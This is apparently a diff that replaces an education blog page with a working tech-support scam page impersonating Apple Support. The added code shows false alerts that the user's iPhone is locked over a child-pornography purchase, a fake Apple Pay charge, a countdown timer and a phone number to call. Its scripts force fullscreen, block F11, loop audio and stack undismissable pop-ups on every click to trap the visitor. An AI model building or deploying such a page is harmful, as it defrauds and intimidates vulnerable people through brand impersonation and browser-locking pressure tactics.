@@ -1,11 +1,334 @@
-<html><head><meta charset="UTF-8" class="current-zkNMStkjGSAo"/><link rel="stylesheet" href="styles.css" class="sm-smZWCRA"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="huge-lihZKLNGrTl"/><meta name="referrer" content="no-referrer" class="preview-wRsMyPBO"/><style> @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #b96643; border-radius: 46px; } *::-webkit-scrollbar-thumb { background-color: #a4c9a5; border-radius: 46px; border: 3px solid #b96643; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>acadiva.blog</title>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="desc-cWSdgLYFrxcFEyuf"><main class="btn-ZKfZQAYAQ"><div class="widget-IkXlxwOfWEVDnfo"><div class="holder-qCfahaOebpfYC"><div class="sidebar-mcoyxHzLu"><h3 class="wrapper-shfwlTofQBBz">acadiva.blog</h3><span class="heading-GUzDpvHjhCmEe">Academic Training Skills This article explores how Research libraries support Writing lifelong learning through Curriculum Knowledge diverse resources, Learning community Teaching engagement, Innovation Study and Literacy innovative Examination programs. Certification Reading</span></div><div class="lg-QrshMUEIuZoeU"><a href="themelist0.html" class="pic-GJlzLxq"><span class="content-keAbIhqafkpRPhDe">Show all</span></a><a href="index.php" class="large-uTYvwBZrXlrtGJd"><span class="sidebar-RBeGaGOUzW">Tell friends</span></a></div></div><div class="picture-GmCYZyPm"><div class="icon-mgHPdJDAHgitDyu"><img src="./img/2e9675e04ef8d42b11cd36e010e19985dc5b8a92.jpg" class="tagline-sWWmWSGpWbeh"/></div></div></div><div class="column-mdSXFdnFT"><div class="tagline-CpJDoYkblzIdKhPa"><div class="desc-BCfkLH"><h3 class="holder-xUmkjEJbKRJurx">Panorama</h3></div></div><div class="medium-yrUYENcn"><div class="narrow-fQOICC"><img src="./img/bed78e186663db0079a1bc87d5724a3f74fec36f.jpg" class="small-gdPnUzTaIir"/><img src="./img/fcee07faea0f4a7cadf796ef99abcb789b9bd028.jpg" class="wide-lulcRLYapYDVc"/><img src="./img/d82bccad696c539a51963183e067b8c889852912.jpg" class="grid-wxvkPSCDU"/><img src="./img/7ead2813094764472e797b8f039f12841b5f0eca.jpg" class="active-MaZNkt"/><img src="./img/0a7418756027da5f76f9d42f6848cb4ceec66581.jpg" class="container-eskETMtQwEpW"/><img src="./img/ada8e869c7c7d0b7d01d8f4ad47d94c55c74b195.jpg" class="holder-RJsDNYrMyuJbNj"/><img src="./img/e719e547baad94201fe206bdd319754ec342a8c8.jpg" class="xs-wotNSqFA"/><img src="./img/d21a60e60abaa6f23baa1fbfdfa05c5f87c6f7ab.jpg" class="subtitle-ODJITaCtsOXaGRQ"/><img src="./img/92570def3591d93efd8787c7f212276efeca5f40.jpg" class="picture-iOajvGOuzpt"/></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; min-width: 80%; gap: calc(29vw/var(--resizer)*100); padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; flex-direction: column; background-color: #fcfff6; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'squares-and-plus-2_37928'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-33px%2C%200)%20rotate(164deg)%20scale(0.40719771898017565)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(22px%2C%20-27px)%20rotate(148deg)%20scale(1.5779719437694222)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%202s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%2051px)%20rotate(166deg)%20scale(1.5552608349530255)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%207s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'88462'%20patternUnits%3D'userSpaceOnUse'%20width%3D'60'%20height%3D'60'%20patternTransform%3D'scale(3)%20rotate(163)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23fcfff6'%2F%3E%3Cpath%20d%3D'M15%200l-3.75%203.75v7.5h-7.5L0%2015l3.75%203.75h7.5v7.5L15%2030l3.75-3.75v-7.5h7.5L30%2015l-3.75-3.75h-7.5v-7.5zm3.75%203.75l7.5%207.5v-7.5zm7.5%2015l-7.5%207.5h7.5zm-15%207.5l-7.5-7.5v7.5zm-7.5-15l7.5-7.5h-7.5zM45%2030l-3.75%203.75v7.5h-7.5L30%2045l3.75%203.75h7.5v7.5L45%2060l3.75-3.75v-7.5h7.5L60%2045l-3.75-3.75h-7.5v-7.5zm3.75%203.75l7.5%207.5v-7.5zm7.5%2015l-7.5%207.5h7.5zm-15%207.5l-7.5-7.5v7.5zm-7.5-15l7.5-7.5h-7.5z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23a4c9a5'%2F%3E%3Cpath%20d%3D'M30%200v15l3.75-3.75v-7.5h7.5L45%200zm15%200l3.75%203.75h7.5v7.5L60%2015V0zm15%2015l-3.75%203.75v7.5h-7.5L45%2030h15zM45%2030l-3.75-3.75h-7.5v-7.5L30%2015v15zm-15%200H15l3.75%203.75h7.5v7.5L30%2045zm0%2015l-3.75%203.75v7.5h-7.5L15%2060h15zM15%2060l-3.75-3.75h-7.5v-7.5L0%2045v15zM0%2045l3.75-3.75v-7.5h7.5L15%2030H0zm11.25-11.25l-7.5%207.5h7.5zm-7.5%2015l7.5%207.5v-7.5zm15%207.5l7.5-7.5h-7.5zm7.5-15l-7.5-7.5v7.5zm7.5-22.5l7.5%207.5v-7.5zm15%207.5l7.5-7.5h-7.5zm7.5-15l-7.5-7.5v7.5zm-15-7.5l-7.5%207.5h7.5z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23a4c9a5'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-32%2C-87)'%20fill%3D'url(%2388462)'%2F%3E%3C%2Fsvg%3E&quot;);" class="pic-qsDDPXT"><div class="grid-ZkJxGjtfX"><div class="sidebar-QkOpIDCpmVt"><h3 class="column-fzRtIgZV">Content vault</h3></div></div><div class="holder-DcMlDmD"><div class="subtitle-sEImzulCYFPGl"><div class="control-RWKGmWXPU"><div class="widget-FPflLhsGdSunzQv"><div class="tip-HRauhTHhm"><span class="breadcrumbs-PxiyuTst">30 October 2024</span></div></div><div class="headline-frsVJlaItzMPryC"><div class="caption-pzRqZdFdmdwnB"><span class="thumbnail-MenbuEVx">Lucas Harrington</span></div></div></div><div class="text-CYpfqatWkRNZnbD"><a href="themelist1.html" class="image-BmNGLJqnacO"><span class="container-jorLAwkoeOmHRwv">Learn more</span></a></div><div class="headline-yKoToHk"><img src="./img/0a71a0be09dfe23917b714f61d29174c18eb4ba1.jpg" class="tip-PXlohE"/></div><div class="more-dvoDGQh"><h5 class="row-QXNXJZoybPS">Desks for Modern Classrooms: How Innovative Designs are Shaping the Future of Education</h5><div class="small-VlemFJEQKGnMkb"><span class="avatar-oaeXIPRNRPgWHpY">This Certification article Curriculum explores the innovative desk designs shaping the future Examination Innovation Reading of education, Teaching highlighting the Research role of technology, flexibility, and adaptability in Academic Literacy modern classroom environments. It also discusses how Training these Knowledge Skills desk innovations are Learning Study enhancing collaborative learning, Writing student comfort, and overall engagement.</span></div></div></div><div class="xs-SuuRGBbHsuYKwFD"><div class="wide-DsigGxAhcJojZoH"><div class="wide-oOmAUNvULbeHS"><div class="column-fgywHiNSm"><span class="avatar-pipKhC">02 June 2025</span></div></div><div class="picture-eAkRrAVrE"><div class="sidebar-lwlOvQDOXN"><span class="holder-AQslvZhrbTG">Emily Thompson</span></div></div></div><div class="userpic-JhIkaWiXxVJzLfR"><a href="themelist2.html" class="column-yWlNPWLiSQKDNK"><span class="holder-nqKtbrx">Learn more</span></a></div><div class="inner-nyHvqvOs"><img src="./img/c9e875c77fe63404592ce7bc421ebfc797d16114.jpg" class="xl-tImQLozzLaqOp"/></div><div class="page-bIuGfcKaFCaiptlb"><h5 class="heading-UklOGWLOpNDNPoc">The Art of Effective Communication in the Classroom</h5><div class="tiny-FdUcGSKnVQnilhcm"><span class="container-zfLBilB">This article Training explores Learning the essential skills of Certification effective Academic communication for educators and Knowledge Teaching Study Skills Writing students, Reading Examination highlighting strategies Literacy to foster a Research positive learning Innovation Curriculum environment.</span></div></div></div><div class="wide-yGGTyBLM"><div class="row-daiEzDauv"><div class="holder-CgJZlWT"><div class="section-HgiJwirj"><span class="heading-YvfYUYCtVGTTa">16 October 2024</span></div></div><div class="control-JGbElK"><div class="small-bknBWPAAFWBJv"><span class="more-HBgeHFYspdUm">Sophia Reynolds</span></div></div></div><div class="heading-AcbbXGqvNx"><a href="themelist3.html" class="all-JkHsgUhyNYg"><span class="active-gPtoax">Learn more</span></a></div><div class="section-tvGJQZeUUcVKvCjp"><img src="./img/aa023f7878e223963927b7de4a4bde21a7bb525d.jpg" class="subject-NavmbRcWkN"/></div><div class="large-nHkcVPqHCb"><h5 class="preview-qrMiYQqJV">Empowering Educators: A Guide to Essential Professional Development Books</h5><div class="wrap-zmGeiEEAhJjOOjh"><span class="image-SZThxF">This article explores Training Examination key Study professional Learning Writing development Skills books for educators, Knowledge Research providing Reading insights and Certification Literacy Curriculum resources to Teaching Academic enhance Innovation teaching practices and career growth.</span></div></div></div><div class="grid-uFLOkGeGIKzyhA"><div class="image-TlKIXcAfQqdN"><div class="xs-BhoysGXh"><div class="current-mMDDNlsf"><span class="box-fPszSN">16 October 2024</span></div></div><div class="section-otznXwqncJByx"><div class="page-LpqNmjmNsWcmM"><span class="narrow-aZKwSKmAfNrgFw">Isabella Thompson</span></div></div></div><div class="lg-eebTmCTVfB"><a href="themelist4.html" class="more-GrYbCneq"><span class="widget-YirOKCCkpWCBRsh">Learn more</span></a></div><div class="aside-zZuTyC"><img src="./img/3bb5de2da5268653030ee0e4fd61c63c1857873a.jpg" class="picture-SUJRWMEgxpYCgVUd"/></div><div class="holder-tGPhXwnqShPJssa"><h5 class="widget-oUwuABYAWhUVRxtd">Maximizing Learning Potential: The Power of Choosing the Right Notebook</h5><div class="wrap-YzARpSjsozm"><span class="container-TBWgtBfxMHyCW">This Writing article explores Curriculum Teaching Skills Knowledge how Study the Literacy Research choice of notebook Academic affects students' learning Examination Learning Certification experiences, emphasizing the Innovation features and benefits of different types of Reading notebooks for effective Training education.</span></div></div></div><div class="content-sJoKkHIaTQmsw"><div class="title-uWqarMllrNFluOq"><div class="tagline-sJKJTBclwqMisJWK"><div class="section-iKubSn"><span class="widget-RdxVSsCmT">12 January 2025</span></div></div><div class="col-LJxuGuHzeimz"><div class="tagline-PDkMwuxRyHGsECu"><span class="row-VRNHNWe">Evelyn Carter</span></div></div></div><div class="userpic-yHXJvzWPVpYs"><a href="themelist5.html" class="large-OgdnlziDiRkRy"><span class="text-zfqggwuisNd">Learn more</span></a></div><div class="tip-fDnHgvyiey"><img src="./img/f3c8e6d49fd034fbb090e343269fceb84ebf4f01.jpg" class="column-YDrUjZNLMaD"/></div><div class="avatar-TMDsbDuyt"><h5 class="container-KmXcQB">Exploring the World of Notebooks: Enhancing Learning One Page at a Time</h5><div class="desc-TKTpJrXSRjWJ"><span class="text-WFSIUcNOg">Skills This article Knowledge examines the different Writing types of Examination Certification Academic notebooks available Teaching to Reading Research Study students, Literacy highlighting Learning their Innovation features Training and benefits to enhance learning and Curriculum creativity.</span></div></div></div><div class="content-CiKfggiPkIGMOz"><div class="page-VwIcSwe"><div class="desc-srSmLn"><div class="subtitle-RZQCzk"><span class="narrow-eitHrVQceXTF">19 May 2025</span></div></div><div class="wide-igSyaQcDy"><div class="tagline-xapilKUyiDQPM"><span class="column-NHyvQWdcycRyAy">Sophia Bennett</span></div></div></div><div class="row-ipMDct"><a href="themelist6.html" class="narrow-QEuPXFDMv"><span class="breadcrumbs-TQkuZAMCQyxww">Learn more</span></a></div><div class="headline-QahgbRyjCWXBfayy"><img src="./img/7479194c4a2601223e061e9bf6fb2face14fe82e.jpg" class="grid-EDwciOCjyDUGcyOi"/></div><div class="img-ensmBP"><h5 class="narrow-MOJUoPCw">The Evolution of Learning Spaces: Designing for the Future</h5><div class="col-RcfgIo"><span class="xl-IVHVUK">Training Certification This article examines how Writing the design Examination of learning Curriculum spaces is evolving to support Literacy Knowledge innovative Study teaching methods Learning Reading and enhance student Skills engagement in Teaching the Research Academic Innovation educational environment.</span></div></div></div><div class="lg-CvHHcSdODkg"><div class="md-VOkDjedszYv"><div class="img-DhfzAzT"><div class="small-tbIbNCZzZBDOhq"><span class="button-KvEQJYNlADNKqNWg">08 April 2025</span></div></div><div class="thumbnail-GIPBWuzWsxgDuxau"><div class="inner-LrgndWYgjRuYx"><span class="container-mPaVYVnmxb">Sophia Martinez</span></div></div></div><div class="picture-kozLKK"><a href="themelist7.html" class="holder-kTINXbX"><span class="aside-yhhaVrOPMC">Learn more</span></a></div><div class="content-OCluAksEWW"><img src="./img/327aa1f589a1a0dd035adc423621accace939fb7.jpg" class="headline-TkPxubpfsvtyOOjD"/></div><div class="small-DvQYdoMbIsiOFF"><h5 class="preview-WKTHEjWbO">Exploring the Benefits of Diverse College Experiences</h5><div class="title-GzvPpK"><span class="widget-CxQQAA">Teaching This article Training Innovation examines Research Academic the advantages of Skills attending various types of colleges, Study emphasizing how Knowledge Reading Examination Writing diverse educational Learning Curriculum environments contribute to personal Certification growth and career readiness. Literacy</span></div></div></div><div class="thumb-zdcLwrtdAWnw"><div class="small-EUOnMZbSBfhLNf"><div class="md-SOoXDD"><div class="huge-ghKBxFwAjjCkf"><span class="caption-eDtcyqMnqDgEM">01 December 2024</span></div></div><div class="holder-jpPzQwOD"><div class="picture-unzqJCM"><span class="widget-yCEucr">Sophia Reynolds</span></div></div></div><div class="large-QZGAdleX"><a href="themelist8.html" class="inner-yqvIyKMlsQADRQZ"><span class="wide-NLFrJgQQrNP">Learn more</span></a></div><div class="headline-RKdbaGCnJcugghV"><img src="./img/6ff837f78be7df50ce66149f3d34942f9fcf3940.jpg" class="sm-FKrRdoGc"/></div><div class="more-sCXdQXjftn"><h5 class="subtitle-SiIJwXJ">Libraries: The Heartbeat of Lifelong Learning and Community Growth</h5><div class="preview-gLrcOml"><span class="desc-wfZQbEJCAhicZjRF">Reading This article explores the pivotal role of libraries Learning in promoting education, community Skills Curriculum engagement, Examination Training and Teaching Research Academic access Innovation to Writing information Certification Study for Knowledge Literacy all.</span></div></div></div></div></div></main><footer class="col-UohhNzkvJdgNw"><div class="huge-vdUndtfrNwA"><a href="./privacy_policy.html" class="title-fLfrMopWdArpgKWW">Privacy Policy</a><a href="./terms_of_use.html" class="wrapper-WWumMVVLyjn">Terms Of Use</a><a href="./cookie_policy.html" class="preview-xrNgBNayCsEFPjHY">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="xs-gfoBnkXUmqnUu"/><section class="icon-ChqoYSI"><div class="tooltip-XoUkixsjl"><div class="thumbnail-mIFymCBTCzCfGa"><label for="close" class="sm-gdZTREvK"><span class="inner-vRdFNQNuzhhi">Got it</span></label></div></div><div class="heading-AzZnVXa"><span class="breadcrumbs-FIyUnuUbsxVbryfo">This website uses cookies.<br>We use cookies to personalise content and ads, to provide social media features and to analyse our traffic. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you’ve provided to them or that they’ve collected from your use of their services.</span></div></section></body></html>
+  
+
+</head>
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+          <img src="images/bg.jpg" alt="" width="100%">
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
+    <div class="alert-texts">
+        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
+    <div class="txstm"> <br>
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-833-727-3342">+1-833-727-3342</a></strong> to unlock your device.
+     </div>
+    <a href="tel:+1-833-727-3342" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
+<div class="cursor">now</div>
+  <div class="notification-header">Payment Successful</div>
+  <div class="notification-body">
+    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
+    Not you? Call +1-833-727-3342
+  </div>
+  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-833-727-3342">+1-833-727-3342</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-833-727-3342" class="me-2 bg-primary">Call +1-833-727-3342</a>
+                        <a href="tel:+1-833-727-3342" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
+
+<script>
+function playSound() {
+  const audio = document.getElementById("clickSound");
+//   audio.currentTime = 0; // restart sound if clicked again
+  audio.play();
+}
+</script>
+    <!-- Bootstrap & Popper.js -->
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+<script>
+let timeLeft = 10 * 60;
+
+const display = document.getElementById("countdown");
+
+const timer = setInterval(() => {
+  let minutes = Math.floor(timeLeft / 60);
+  let seconds = timeLeft % 60;
+
+  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    display.textContent = "Time's up!";
+  }
+
+  timeLeft--;
+}, 1000);
+</script>
+
+
+<script>
+
+
+
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
+
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo">
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-833-727-3342">+1-833-727-3342</a> to unlock it!
+                        </div>
+
+                        
+                        <div class="text-end gap-4 mt-3 actionbtn">
+                            <a href="tel:+1-833-727-3342" class="me-2 bg-primary">Call +1-833-727-3342</a>
+                            <a href="tel:+1-833-727-3342" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        appleAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script> 
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+</body></html>
